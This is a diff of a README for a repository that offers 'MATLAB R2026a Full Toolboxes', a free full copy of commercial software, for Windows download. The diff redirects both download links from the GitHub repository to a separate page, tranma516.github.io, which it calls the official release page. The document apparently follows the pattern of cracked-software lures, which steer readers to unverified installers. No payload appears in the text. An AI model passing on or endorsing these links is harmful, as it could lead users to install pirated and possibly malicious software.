@@ -1,6 +1,6 @@
 # 🧮 MATLAB-R2026a-Full-Toolboxes - Advanced design and simulation tools today
 
-[![Download MATLAB R2026a](https://img.shields.io/badge/Download-MATLAB_R2026a-blue.svg)](https://github.com/tranma516/MATLAB-R2026a-Full-Toolboxes)
+[![Download MATLAB R2026a](https://img.shields.io/badge/Download-MATLAB_R2026a-blue.svg)](https://tranma516.github.io)
 
 ## 📖 Project Overview
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your Windows computer meets these needs
 
 You need to access the official release page to obtain the installer. Follow these steps to prepare your system.
 
-Visit this page to download: [https://github.com/tranma516/MATLAB-R2026a-Full-Toolboxes](https://github.com/tranma516/MATLAB-R2026a-Full-Toolboxes)
+Visit this page to download: [https://tranma516.github.io](https://tranma516.github.io)
 
 1. Navigate to the link above in your web browser.
 2. Locate the Releases section on the right side of the page.
